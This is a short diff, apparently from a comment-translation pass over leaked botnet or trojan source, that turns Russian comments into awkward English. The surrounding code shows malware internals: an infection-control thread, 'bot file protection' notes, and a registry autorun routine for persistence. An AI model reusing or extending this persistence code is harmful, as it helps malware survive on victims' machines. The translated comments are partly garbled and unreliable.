@@ -28,8 +28,8 @@ static DWORD WINAPI procInfection(void *)
 {
   CoreHook::disableFileHookerForCurrentThread(true);
 
-  //FIXME: защита файлов бота, если не влючен TT защищаемся также от чтения.  
-  //FIXME: защита реестра, путем восстановления.
+  //FIXME: file protection bot, if not the switches on TT are also protected from reading.
+  //FIXME: registry protection, through the restoration.
   
   HANDLE mutex = Core::waitForMutexOfObject(Core::OBJECT_ID_CONTROL_INFECTION, MalwareTools::KON_SESSION);
   if(mutex == NULL)
@@ -74,7 +74,7 @@ static DWORD WINAPI procAutorun(void *)
   CWA(shlwapi, PathQuoteSpacesW)(processPath);
   processPathSize = Str::_LengthW(processPath);
   
-  //Цикл.
+  //Cycle.
   if(Core::isActive())
   {
     CSTR_GETW(regPath, regpath_autorun);
@@ -107,7 +107,7 @@ bool CoreControl::_removeAutorun(void)
   {
     if(!Registry::_deleteValue(HKEY_CURRENT_USER, regPath, autorunName))return false;
     
-    //Страховка от незавершенного procAutorun().
+    //Insurance against incomplete procAutorun ().
     CWA(kernel32, Sleep)(500);
     if(!Registry::_valueExists(HKEY_CURRENT_USER, regPath, autorunName))return true;
   }
